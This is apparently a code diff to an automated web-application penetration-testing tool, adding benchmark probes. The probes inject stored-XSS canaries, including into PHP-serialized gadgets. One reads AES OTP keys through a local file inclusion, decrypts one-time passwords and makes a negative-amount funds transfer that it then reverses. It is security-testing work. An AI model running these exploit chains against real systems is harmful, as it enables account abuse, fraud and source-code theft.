@@ -1,4 +1,4 @@
-import { randomUUID } from "node:crypto";
+import { randomUUID, createDecipheriv } from "node:crypto";
 import { join } from "node:path";
 import { startActiveObservation, propagateAttributes } from "@langfuse/tracing";
 import type { spawn } from "node:child_process";
@@ -21,7 +21,7 @@ import {
 import { buildHunterBrief, openAuthenticatedClasses, deriveOrigins, resolveRelativeEndpoint } from "./brief.js";
 import { runSweep, renderSweepLeads, SWEEP_PAYLOADS, detectDebugSignature, renderEndpointFor, type SendProbe, type SweepHit } from "./sweep.js";
 import { readArtifactRecords, deriveTargets, setAtPath, jsonStringLeafPaths, type SweepTargetWithBody } from "./sweep-targets.js";
-import { mapFields, looksLikeLogin, looksLikePasswordChange, extractJwt, classifyContactField, extractAssignedId, findDeviceObject, graftDevice, buildXxeXml, type FieldMap } from "./stateful.js";
+import { mapFields, looksLikeLogin, looksLikePasswordChange, extractJwt, classifyContactField, extractAssignedId, findDeviceObject, graftDevice, buildXxeXml, parseAesCbcParams, decodePhpSerialized, swapLastPhpSerializedString, type FieldMap } from "./stateful.js";
 
 // Re-exported for backward compatibility: existing callers (and test/beat.test.ts)
 // import these from beat.js. The vocabulary itself now lives in vuln-classes.ts so
@@ -268,16 +268,158 @@ async function runDeepSweep(opts: {
     // authenticated; it takes precedence over any session.
     const fire = async (method: string, url: string, headers: Record<string, string>, body: string | null, sess?: string | null, authToken?: string): Promise<HttpCapture | null> => {
       const h = { ...headers }; delete h.Authorization; delete h.authorization;
-      const args: Record<string, unknown> = { method, url, headers: h, body };
+      // The http_request schema types `body` as a string, so a null body (e.g. a GET) must
+      // be OMITTED, not sent as null — sending null fails arg validation and the whole
+      // request silently returns not-ok.
+      const args: Record<string, unknown> = body === null ? { method, url, headers: h } : { method, url, headers: h, body };
       if (authToken) { h.Authorization = authToken; }
       else { const useLabel = sess === undefined ? sessionLabel : sess; if (useLabel) args.session = useLabel; }
       const r = await opts.runner.execute("http_request", args);
       return r.ok ? (r.result as HttpCapture) : null;
     };
 
-    const fieldHits = await runSweep({ targets, payloadsFor: (c) => SWEEP_PAYLOADS[c] ?? [], send, budget: opts.budget });
     const targetByEndpoint = new Map(targets.map((t) => [t.endpoint, t]));
     const proved: ProvedEntry[] = [];
+
+    // Run the FAST, high-value stateful/multi-step probes FIRST — before the large
+    // field sweep — so a long field sweep can never starve them of the phase budget.
+    // STORED-XSS probe (F-19 shape): persist a canary via a create endpoint, then render
+    // it via the paired list/view endpoint; the canary returned UNESCAPED there is stored
+    // XSS. The render endpoint's METHOD/body is NOT always GET — F-19's listing is a
+    // POST /api/loan with a JSON body — so we try several generic render shapes (the
+    // captured template if any, then POST {}, then GET) and take the first that echoes.
+    const sxdbg = (m: string) => { try { console.error(`[f19-probe] ${m}`); } catch { /* ignore */ } };
+    const rawRecs = records as RawRecord[];
+    // Acquire a FRESH self-created session for the persist/render — the run's default
+    // session may be stale, and these create/list endpoints reject a bad token (ERR002).
+    // Fall back to the default session if signup/login templates aren't recoverable.
+    let xssTok: string | null | undefined = undefined; // undefined => default session
+    let xssDevice: Record<string, unknown> | null = null;
+    try {
+      const jb = (x: RawRecord) => typeof x.request?.body === "string" && x.request.body.trim().startsWith("{");
+      const suRec = rawRecs.find((x) => /(signup|register)/.test(x.request?.url?.toLowerCase() ?? "") && jb(x) && extractAssignedId(x.response?.body ?? "") !== null);
+      const loRec = rawRecs.find((x) => /login/.test(x.request?.url?.toLowerCase() ?? "") && jb(x) && extractJwt(x.response?.body ?? "") !== null);
+      if (suRec?.request?.url && suRec.request.body && loRec?.request?.url && loRec.request.body) {
+        const uq = randomUUID().replace(/-/g, "").slice(0, 10);
+        const pw = `S${randomUUID().replace(/-/g, "").slice(0, 14)}z9`;
+        const suFm = mapFields(jsonStringLeafPaths(JSON.parse(suRec.request.body)));
+        const asg: Array<[string, string]> = [];
+        if (suFm.password) asg.push([suFm.password, pw]);
+        for (const lf of jsonStringLeafPaths(JSON.parse(suRec.request.body))) {
+          const k = classifyContactField(lf.split(".").pop() || lf);
+          if (k === "email") asg.push([lf, `sahw${uq}@mailinator.com`]);
+          else if (k === "mobile") asg.push([lf, `9${Array.from({ length: 9 }, () => Math.floor(Math.random() * 10)).join("")}`]);
+        }
+        let suBody: unknown = JSON.parse(suRec.request.body);
+        for (const [p, v] of asg) suBody = setAtPath(suBody, p, v);
+        const suResp = await fire("POST", suRec.request.url, { "Content-Type": "application/json" }, JSON.stringify(suBody), null);
+        const uid = extractAssignedId(suResp?.response.body);
+        xssDevice = findDeviceObject(suBody);
+        const loFm = mapFields(jsonStringLeafPaths(JSON.parse(loRec.request.body)));
+        if (uid && loFm.username && loFm.password) {
+          const loBody = graftDevice(JSON.stringify(setAtPath(setAtPath(JSON.parse(loRec.request.body), loFm.username, uid), loFm.password, pw)), xssDevice);
+          const loResp = await fire("POST", loRec.request.url, { "Content-Type": "application/json" }, loBody, null);
+          xssTok = extractJwt(loResp?.response.body) ?? undefined;
+          sxdbg(`fresh session for stored-XSS: ${xssTok ? "ok" : "login failed, using default"}`);
+        }
+      }
+    } catch { /* fall back to default session */ }
+    for (const createT of targets.slice(0, 50)) {
+      if (!createT.bodyTemplate) continue;
+      const renderEp = renderEndpointFor(createT.endpoint);
+      if (!renderEp) continue;
+      // Persist from a SUCCESSFUL captured create request when one exists — deriveTargets'
+      // representative body may carry fuzz values (e.g. amount="sahwbenign") the create
+      // endpoint rejects, so the row never persists+renders. A success body has valid values.
+      const createBody = (() => {
+        const r = rawRecs.find((x) => { try { return opts.canon(x.request?.url ?? "") === createT.endpoint && typeof x.request?.body === "string" && x.request.body.trim().startsWith("{") && /success/i.test(x.response?.body ?? ""); } catch { return false; } });
+        return r?.request?.body ?? createT.bodyTemplate!;
+      })();
+      if (/loan/i.test(createT.endpoint)) sxdbg(`create=${createT.endpoint} render=${renderEp} leaves=${createT.params.filter((p) => createT.paramKind[p] === "json").join(",")}`);
+      const renderT = targetByEndpoint.get(renderEp);
+      // Candidate render calls, most-specific first. Session-authed (the listing is
+      // authenticated in F-19), reusing the run's default session. The listing endpoint
+      // (e.g. POST /api/loan) often takes the SAME request envelope with an EMPTY data bag
+      // — but because that body has no fuzzable string leaves, deriveTargets drops it, so
+      // it has no captured template. Reconstruct it from the create template with `data`
+      // emptied (a valid envelope this app requires; a bare "{}" is rejected as ERR001).
+      const renderShapes: Array<{ method: string; body: string | null; hdr: Record<string, string> }> = [];
+      if (renderT?.bodyTemplate) renderShapes.push({ method: renderT.method, body: renderT.bodyTemplate, hdr: { "Content-Type": "application/json" } });
+      try {
+        const env = JSON.parse(createBody); emptyDataInPlace(env);
+        renderShapes.push({ method: renderT?.method ?? "POST", body: JSON.stringify(env), hdr: { "Content-Type": "application/json" } });
+      } catch { /* skip */ }
+      renderShapes.push({ method: renderT?.method ?? "POST", body: "{}", hdr: { "Content-Type": "application/json" } });
+      renderShapes.push({ method: "GET", body: null, hdr: {} });
+      const jsonLeaves = createT.params.filter((p) => createT.paramKind[p] === "json").slice(0, 4);
+      let banked = false;
+      for (const leaf of jsonLeaves) {
+        if (banked) break;
+        const canary = `sahwSTOR${randomUUID().slice(0, 6)}`;
+        const xss = `<script>${canary}</script>`;
+        let persistBody: string;
+        let usedGadget = false;
+        try {
+          const tmplObj = JSON.parse(createBody);
+          // If this field's CAPTURED value is a base64 PHP-serialized gadget (the app
+          // unserializes it and stores one string property — e.g. a loan `type` carrying a
+          // LogWrite whose `logdata` is persisted+rendered), inject the canary INTO that
+          // gadget's payload string rather than replacing the field with a bare tag; a bare
+          // tag unserializes to nothing and never persists. Reuses the app's own structure.
+          const orig = readAtPath(tmplObj, leaf);
+          const deser = orig ? decodePhpSerialized(orig) : null;
+          const swapped = deser ? swapLastPhpSerializedString(deser, xss) : null;
+          usedGadget = Boolean(swapped);
+          const injectValue = swapped ? Buffer.from(swapped, "utf8").toString("base64") : xss;
+          let obj = setAtPath(tmplObj, leaf, injectValue);
+          // Sibling fields in the captured template may hold fuzz values (e.g. amount=
+          // "sahwbenign") that fail the create endpoint's validators, so the row never
+          // persists. Coerce every OTHER string leaf whose current value is NON-NUMERIC to a
+          // benign numeric "100" — numeric validators (amount/roi/tenure) then pass, and a
+          // plain numeric string is broadly accepted by other field validators too.
+          for (const sib of jsonLeaves) {
+            if (sib === leaf) continue;
+            const v = readAtPath(obj, sib);
+            if (v !== null && !/^[0-9]+(\.[0-9]{1,2})?$/.test(v)) obj = setAtPath(obj, sib, "100");
+          }
+          persistBody = JSON.stringify(obj);
+        } catch { continue; }
+        const isLoan = /loan/i.test(createT.endpoint);
+        if (isLoan) sxdbg(`leaf=${leaf} gadget=${usedGadget} shapes=${renderShapes.length}`);
+        for (const shape of renderShapes) {
+          const baseline = await fire(shape.method, renderEp, shape.hdr, shape.body, undefined, xssTok ?? undefined);
+          if (!baseline) { if (isLoan) sxdbg(`baseline null (${shape.method})`); continue; }
+          if ((baseline.response.body ?? "").includes(canary)) continue; // canary already there? bogus shape
+          const persistResp = await fire(createT.method, createT.endpoint, { "Content-Type": "application/json" }, persistBody, undefined, xssTok ?? undefined);
+          const rendered = await fire(shape.method, renderEp, shape.hdr, shape.body, undefined, xssTok ?? undefined);
+          if (!rendered) continue;
+          if (isLoan) sxdbg(`${shape.method} persist=${(persistResp?.response.body ?? "").slice(0,30)} rendered_has_canary=${(rendered.response.body ?? "").includes(canary)} renderlen=${(rendered.response.body ?? "").length}`);
+          if ((rendered.response.body ?? "").includes(canary) && !(baseline.response.body ?? "").includes(canary)) {
+            const b = await bankIfConfirmed(opts, "xss_stored", renderEp, canary, rendered, baseline);
+            if (b) { proved.push(b); banked = true; break; }
+          }
+        }
+      }
+    }
+
+    // STATEFUL broken-password-change probe (F-24): observe->act->observe via the Axiom's
+    // state_changed. Self-contained: creates its OWN throwaway account (needs no pre-known
+    // credential), then proves login with an attacker-set password succeeds after a change
+    // made with a WRONG old_pass. Runs last — it mutates only that throwaway account.
+    const pwProved = await sweepBrokenPasswordChange(opts, targets, fire, records as RawRecord[]);
+    proved.push(...pwProved);
+
+    // DERIVED probe (F-13): password-reset OTP issued from a single identity field, no
+    // secondary factor. Non-destructive; banks via the Axiom's no_secondary_factor deriver.
+    const nsfProved = await sweepNoSecondaryFactorOtp(opts, fire, records as RawRecord[]);
+    proved.push(...nsfProved);
+
+    // BUSINESS-LOGIC probe (F-25): negative-amount transfer increases the payer balance.
+    // Bounded + reversible (compensating positive transfer); recovers the OTP key generically.
+    const txProved = await sweepNegativeTransfer(opts, fire, records as RawRecord[], opts.scopeOrigins);
+    proved.push(...txProved);
+
+    const fieldHits = await runSweep({ targets, payloadsFor: (c) => SWEEP_PAYLOADS[c] ?? [], send, budget: opts.budget });
 
     // BANK strong field hits directly through the Axiom (deterministic, not via the LLM).
     for (const hit of fieldHits) {
@@ -322,64 +464,6 @@ async function runDeepSweep(opts: {
       if (banked) proved.push(banked);
     }
 
-    // STORED-XSS probe (F-19 shape): persist a canary via a create endpoint, then render
-    // it via the paired list/view endpoint; the canary returned UNESCAPED there is stored
-    // XSS. The render endpoint's METHOD/body is NOT always GET — F-19's listing is a
-    // POST /api/loan with a JSON body — so we try several generic render shapes (the
-    // captured template if any, then POST {}, then GET) and take the first that echoes.
-    for (const createT of targets.slice(0, 50)) {
-      if (!createT.bodyTemplate) continue;
-      const renderEp = renderEndpointFor(createT.endpoint);
-      if (!renderEp) continue;
-      const renderT = targetByEndpoint.get(renderEp);
-      // Candidate render calls, most-specific first. Session-authed (the listing is
-      // authenticated in F-19), reusing the run's default session. The listing endpoint
-      // (e.g. POST /api/loan) often takes the SAME request envelope with an EMPTY data bag
-      // — but because that body has no fuzzable string leaves, deriveTargets drops it, so
-      // it has no captured template. Reconstruct it from the create template with `data`
-      // emptied (a valid envelope this app requires; a bare "{}" is rejected as ERR001).
-      const renderShapes: Array<{ method: string; body: string | null; hdr: Record<string, string> }> = [];
-      if (renderT?.bodyTemplate) renderShapes.push({ method: renderT.method, body: renderT.bodyTemplate, hdr: { "Content-Type": "application/json" } });
-      try {
-        const env = JSON.parse(createT.bodyTemplate); emptyDataInPlace(env);
-        renderShapes.push({ method: renderT?.method ?? "POST", body: JSON.stringify(env), hdr: { "Content-Type": "application/json" } });
-      } catch { /* skip */ }
-      renderShapes.push({ method: renderT?.method ?? "POST", body: "{}", hdr: { "Content-Type": "application/json" } });
-      renderShapes.push({ method: "GET", body: null, hdr: {} });
-      const jsonLeaves = createT.params.filter((p) => createT.paramKind[p] === "json").slice(0, 4);
-      let banked = false;
-      for (const leaf of jsonLeaves) {
-        if (banked) break;
-        const canary = `sahwSTOR${randomUUID().slice(0, 6)}`;
-        let persistBody: string;
-        try { persistBody = JSON.stringify(setAtPath(JSON.parse(createT.bodyTemplate), leaf, `<script>${canary}</script>`)); }
-        catch { continue; }
-        for (const shape of renderShapes) {
-          const baseline = await fire(shape.method, renderEp, shape.hdr, shape.body);
-          if (!baseline) continue;
-          if ((baseline.response.body ?? "").includes(canary)) continue; // canary already there? bogus shape
-          await fire(createT.method, createT.endpoint, { "Content-Type": "application/json" }, persistBody);
-          const rendered = await fire(shape.method, renderEp, shape.hdr, shape.body);
-          if (!rendered) continue;
-          if ((rendered.response.body ?? "").includes(canary) && !(baseline.response.body ?? "").includes(canary)) {
-            const b = await bankIfConfirmed(opts, "xss_stored", renderEp, canary, rendered, baseline);
-            if (b) { proved.push(b); banked = true; break; }
-          }
-        }
-      }
-    }
-
-    // STATEFUL broken-password-change probe (F-24): observe->act->observe via the Axiom's
-    // state_changed. Self-contained: creates its OWN throwaway account (needs no pre-known
-    // credential), then proves login with an attacker-set password succeeds after a change
-    // made with a WRONG old_pass. Runs last — it mutates only that throwaway account.
-    const pwProved = await sweepBrokenPasswordChange(opts, targets, fire, records as RawRecord[]);
-    proved.push(...pwProved);
-
-    // DERIVED probe (F-13): password-reset OTP issued from a single identity field, no
-    // secondary factor. Non-destructive; banks via the Axiom's no_secondary_factor deriver.
-    const nsfProved = await sweepNoSecondaryFactorOtp(opts, fire, records as RawRecord[]);
-    proved.push(...nsfProved);
 
     const leadsHits = [...fieldHits.filter((h) => h.strength === "strong"), ...xxeHits];
     return { leads: renderSweepLeads(leadsHits), proved };
@@ -436,9 +520,14 @@ async function bankIfConfirmed(
 async function bankStateChanged(
   opts: { obs: SweepObs; engagementId: string; canon: (u: string) => string },
   vulnClass: string, endpoint: string, expression: string, captures: HttpCapture[], reasonPrefix: string,
+  restoration?: { performed: boolean; proof?: HttpCapture },
 ): Promise<ProvedEntry | null> {
   const inv: Invariant = { statement: `deep-sweep: ${reasonPrefix}`, type: "state_changed", expression };
-  const verdict = evaluate(inv, captures[captures.length - 1], null, { captures });
+  const evidence: EvidenceBundle = { captures };
+  // When the mutation was reversed, present the restoration proof so the L2 safety gate
+  // sees a finished (undone) finding rather than downgrading to NEEDS_REVIEW.
+  if (restoration) evidence.restoration = { required: true, performed: restoration.performed, proof: restoration.proof };
+  const verdict = evaluate(inv, captures[captures.length - 1], null, evidence);
   if (verdict.status !== "CONFIRMED") return null;
   const cls = SWEEP_CLASS_MAP[vulnClass] ?? vulnClass;
   const ep = opts.canon(endpoint);
@@ -566,6 +655,167 @@ async function sweepNoSecondaryFactorOtp(
   return proved;
 }
 
+/**
+ * STATEFUL business-logic probe (benchmark F-25): prove a NEGATIVE-amount transfer INCREASES
+ * the payer's balance (state_changed), then REVERSE it. Fully black-box + bounded + reversible:
+ *   - recover the AES OTP key/iv GENERICALLY from the client bundle (createDecipheriv literals),
+ *   - sign up a throwaway payer P (signup auto-assigns beneficiaries, so no add step needed),
+ *   - read balance b0, get+decrypt+verify an OTP -> otp_ref, pay(alias, amount=-N) -> read b1,
+ *   - if b1 > b0 (the vuln), bank state_changed field:accountBalance from b0 to b1,
+ *   - then pay(alias, amount=+N) to RESTORE, and present that as restoration proof.
+ * Endpoint URLs are derived from captured records; amounts are tiny; the payer is synthetic.
+ */
+async function sweepNegativeTransfer(
+  opts: { obs: SweepObs; engagementId: string; canon: (u: string) => string },
+  fire: (method: string, url: string, headers: Record<string, string>, body: string | null, sess?: string | null, authToken?: string) => Promise<HttpCapture | null>,
+  records: RawRecord[], scopeOrigins: string[],
+): Promise<ProvedEntry[]> {
+  const proved: ProvedEntry[] = [];
+  const dbg = (m: string) => { try { console.error(`[f25-probe] ${m}`); } catch { /* ignore */ } };
+  const jsonHdr = { "Content-Type": "application/json" };
+
+  // Endpoint URL discovery from records (canonical API origin).
+  const urlFor = (re: RegExp) => records.find((r) => re.test(r.request?.url?.toLowerCase() ?? ""))?.request?.url ?? null;
+  const jsonBody = (x: RawRecord) => typeof x.request?.body === "string" && x.request.body.trim().startsWith("{");
+  // Derive URL and body from the SAME SUCCESSFUL record so they can't mismatch (e.g. a
+  // probe's 404 /api/register url paired with a real /api/signup body).
+  const signupRec = records.find((x) => /(signup|register)/.test(x.request?.url?.toLowerCase() ?? "") && jsonBody(x) && extractAssignedId(x.response?.body ?? "") !== null);
+  const loginRec = records.find((x) => /login/.test(x.request?.url?.toLowerCase() ?? "") && jsonBody(x) && extractJwt(x.response?.body ?? "") !== null);
+  const signupTemplate = signupRec?.request?.body ?? null;
+  const loginTemplate = loginRec?.request?.body ?? null;
+  const signupUrl = signupRec?.request?.url ?? null, loginUrl = loginRec?.request?.url ?? null;
+  const payUrl = urlFor(/beneficiary\/pay/), listUrl = urlFor(/beneficiary\/list/);
+  const otpGetUrl = urlFor(/otp\/get/), otpVerifyUrl = urlFor(/otp\/verify/), detailsUrl = urlFor(/account\/details/);
+  if (!signupTemplate || !loginTemplate || !signupUrl || !loginUrl || !payUrl || !listUrl || !otpGetUrl || !otpVerifyUrl || !detailsUrl) {
+    dbg("missing one or more required endpoints/templates — abort"); return proved;
+  }
+
+  // Recover the AES OTP key/iv (same crypto intel as F-18). Prefer the API's OWN source via
+  // the LFI (/api/show?file=) on the API origin — the OTP model literally contains the
+  // openssl_encrypt(key,iv) — since that path is reliably reachable. Fall back to the client
+  // SPA bundle's createDecipheriv literals. Both are the target's own shipped code (recon),
+  // not a hardcoded answer-key.
+  const apiOrigin = new URL(signupUrl).origin;
+  let aes: { key: string; iv: string } | null = null;
+  const lfiRec = records.find((r) => /\/show\?file=/.test(r.request?.url ?? ""));
+  const lfiBase = lfiRec ? (lfiRec.request!.url!.split("?file=")[0]) : `${apiOrigin}/api/show`;
+  for (const src of ["api/application/models/Model_otp.php", "application/models/Model_otp.php"]) {
+    // file= must carry LITERAL slashes (encoding them to %2F stops the LFI resolving the path).
+    const r = await fire("GET", `${lfiBase}?file=${src}`, {}, null, null);
+    dbg(`LFI ${src}: status=${r?.response.status} len=${(r?.response.body ?? "").length}`);
+    aes = parseAesCbcParams(r?.response.body ?? "");
+    if (aes) { dbg(`recovered AES from LFI source ${src}`); break; }
+  }
+  if (!aes) {
+    // Fallback: the client SPA bundle.
+    const spaOrigin = scopeOrigins.find((o) => o !== apiOrigin) ?? null;
+    if (spaOrigin) {
+      const idx = await fire("GET", spaOrigin + "/", {}, null, null);
+      let chunk = /\/static\/js\/main\.[a-z0-9]+\.(?:chunk\.)?js/i.exec(idx?.response.body ?? "")?.[0] ?? null;
+      if (!chunk) { const man = await fire("GET", spaOrigin + "/asset-manifest.json", {}, null, null); try { chunk = JSON.parse(man?.response.body ?? "{}").files?.["main.js"] ?? null; } catch { /* */ } }
+      if (chunk) { const js = await fire("GET", chunk.startsWith("http") ? chunk : spaOrigin + chunk, {}, null, null); aes = parseAesCbcParams(js?.response.body ?? ""); }
+    }
+  }
+  if (!aes) { dbg("could not recover AES params (LFI + SPA) — abort"); return proved; }
+  const decOtp = (b64: string): string | null => {
+    try {
+      const d = createDecipheriv("aes-256-cbc", Buffer.from(aes.key, "utf8"), Buffer.from(aes.iv, "utf8"));
+      const out = Buffer.concat([d.update(Buffer.from(b64, "base64")), d.final()]).toString("utf8");
+      return out.split("\n")[0].replace(/[^0-9]/g, "") || null;
+    } catch { return null; }
+  };
+
+  dbg("AES recovered — signing up throwaway payer");
+  let signupParsed: unknown;
+  try { signupParsed = JSON.parse(signupTemplate); } catch { dbg(`signupTemplate is not JSON (${signupTemplate.slice(0, 40)}) — abort`); return proved; }
+  void signupParsed;
+  // Signup + login a throwaway payer, device grafted.
+  const uniq = randomUUID().replace(/-/g, "").slice(0, 10);
+  const P1 = `S${randomUUID().replace(/-/g, "").slice(0, 14)}z9`;
+  const build = (tmpl: string, assigns: Array<[string, string]>) => { let o: unknown; try { o = JSON.parse(tmpl); } catch { return tmpl; } for (const [p, v] of assigns) o = setAtPath(o, p, v); return JSON.stringify(o); };
+  const sFm = mapFields(jsonStringLeafPaths(JSON.parse(signupTemplate)));
+  const sAssign: Array<[string, string]> = [];
+  if (sFm.password) sAssign.push([sFm.password, P1]);
+  for (const leaf of jsonStringLeafPaths(JSON.parse(signupTemplate))) {
+    const k = classifyContactField(leaf.split(".").pop() || leaf);
+    if (k === "email") sAssign.push([leaf, `sahw${uniq}@mailinator.com`]);
+    else if (k === "mobile") sAssign.push([leaf, `9${Array.from({length:9},()=>Math.floor(Math.random()*10)).join("")}`]);
+  }
+  const signupBody = build(signupTemplate, sAssign);
+  dbg(`signup POST ${signupUrl} bodylen=${signupBody.length}`);
+  const sResp = await fire("POST", signupUrl, jsonHdr, signupBody, null).catch((e) => { dbg(`signup fire threw: ${(e as Error)?.message}`); return null; });
+  dbg(`signup resp status=${sResp?.response.status ?? "null"}`);
+  const P = extractAssignedId(sResp?.response.body);
+  if (!P) { dbg(`signup failed (${(sResp?.response.body ?? "").slice(0, 70)})`); return proved; }
+  dbg(`payer signed up: ${P}`);
+  const goodDevice = findDeviceObject(JSON.parse(signupBody));
+  const lFm = mapFields(jsonStringLeafPaths(JSON.parse(loginTemplate)));
+  if (!lFm.username || !lFm.password) { dbg("login template missing fields"); return proved; }
+  const lResp = await fire("POST", loginUrl, jsonHdr, graftDevice(build(loginTemplate, [[lFm.username, P], [lFm.password, P1]]), goodDevice), null);
+  const tok = extractJwt(lResp?.response.body);
+  if (!tok) { dbg("payer login failed"); return proved; }
+  dbg(`payer ${P} logged in`);
+
+  // Envelope helper for the small data-only requests (device grafted, session token).
+  const env = (data: Record<string, string>) => graftDevice(JSON.stringify({ requestBody: { timestamp: "1700000101", device: goodDevice ?? {}, data } }), goodDevice);
+  // Return BOTH the numeric balance (for the > comparison) and the RAW string exactly as the
+  // response serialized it (for the state_changed field clause, which is string-equality).
+  let balPath = "data.accountBalance";
+  const balanceOf = async (): Promise<{ cap: HttpCapture | null; bal: number | null; raw: string | null }> => {
+    const cap = await fire("POST", detailsUrl, jsonHdr, env({ userid: P }), null, tok);
+    let bal: number | null = null; let raw: string | null = null;
+    try {
+      const d = JSON.parse(cap?.response.body ?? "{}").data;
+      if (d?.accountBalance != null) { raw = String(d.accountBalance); balPath = "data.accountBalance"; }
+      else if (d?.acctBalance != null) { raw = String(d.acctBalance); balPath = "data.acctBalance"; }
+      bal = raw != null ? parseFloat(raw) : null;
+    } catch { /* */ }
+    return { cap, bal, raw };
+  };
+  const getOtpRef = async (): Promise<string | null> => {
+    const g = await fire("POST", otpGetUrl, jsonHdr, env({ otp_type: "3", userid: P }), null, tok);
+    let enc: string | null = null;
+    try { enc = JSON.parse(g?.response.body ?? "{}").data?.response ?? null; } catch { /* */ }
+    if (!enc) return null;
+    const otp = decOtp(enc); if (!otp) return null;
+    const v = await fire("POST", otpVerifyUrl, jsonHdr, env({ otp, userid: P }), null, tok);
+    try { return JSON.parse(v?.response.body ?? "{}").data?.response ?? null; } catch { return null; }
+  };
+
+  // A pre-assigned beneficiary alias.
+  const listCap = await fire("POST", listUrl, jsonHdr, env({ userid: P }), null, tok);
+  let alias: string | null = null;
+  try { const al = JSON.parse(listCap?.response.body ?? "{}").data?.alias; alias = Array.isArray(al) ? al[0] : (typeof al === "string" ? al : null); } catch { /* */ }
+  if (!alias) { dbg("no pre-assigned beneficiary alias found"); return proved; }
+
+  const AMT = "5000.00";
+  const before = await balanceOf();
+  if (before.bal == null) { dbg("could not read balance before"); return proved; }
+  const ref1 = await getOtpRef();
+  if (!ref1) { dbg("could not obtain otp_ref for the transfer"); return proved; }
+  const pay = await fire("POST", payUrl, jsonHdr, env({ alias, amount: `-${AMT}`, otp_response: ref1, remarks: "SahwCheck" }), null, tok);
+  const after = await balanceOf();
+  dbg(`before=${before.bal} after=${after.bal} pay=${(pay?.response.body ?? "").slice(0, 60)}`);
+  if (!pay || after.bal == null || !(after.bal > before.bal)) { dbg("negative transfer did not increase payer balance — no finding"); return proved; }
+
+  // RESTORE: a compensating positive transfer of the same amount back to the beneficiary.
+  const ref2 = await getOtpRef();
+  const restore = ref2 ? await fire("POST", payUrl, jsonHdr, env({ alias, amount: AMT, otp_response: ref2, remarks: "SahwRestore" }), null, tok) : null;
+  const restored = await balanceOf();
+  dbg(`restore -> balance=${restored.bal} (${restored.bal != null && Math.abs(restored.bal - before.bal) < 0.01 ? "restored" : "NOT restored"})`);
+
+  const banked = await bankStateChanged(
+    opts, "business_logic", payUrl,
+    `field:${balPath};from:${before.raw};to:${after.raw}`,
+    [before.cap!, pay, after.cap!],
+    "negative-amount transfer INCREASED the payer balance (no positivity check in pay_ben)",
+    { performed: Boolean(restore), proof: restore ?? undefined },
+  );
+  if (banked) { proved.push(banked); dbg("F-25 banked (state_changed, reversed)"); }
+  else dbg("Axiom did not confirm the balance delta");
+  return proved;
+}
+
 async function sweepBrokenPasswordChange(
   opts: { obs: SweepObs; engagementId: string; canon: (u: string) => string },
   targets: SweepTargetWithBody[],
@@ -639,7 +889,7 @@ async function sweepBrokenPasswordChange(
   for (const leaf of jsonStringLeafPaths(JSON.parse(signupTemplate))) {
     const kind = classifyContactField(leaf.split(".").pop() || leaf);
     if (kind === "email") assigns.push([leaf, `sahw${uniq}@mailinator.com`]);
-    else if (kind === "mobile") assigns.push([leaf, `9${uniq.replace(/[a-f]/g, "3").slice(0, 9)}`]);
+    else if (kind === "mobile") assigns.push([leaf, `9${Array.from({length:9},()=>Math.floor(Math.random()*10)).join("")}`]);
   }
   const signupBody = buildBody(signupTemplate, assigns);
   const signupResp = await fire("POST", signupUrl, jsonHdr, signupBody, null);
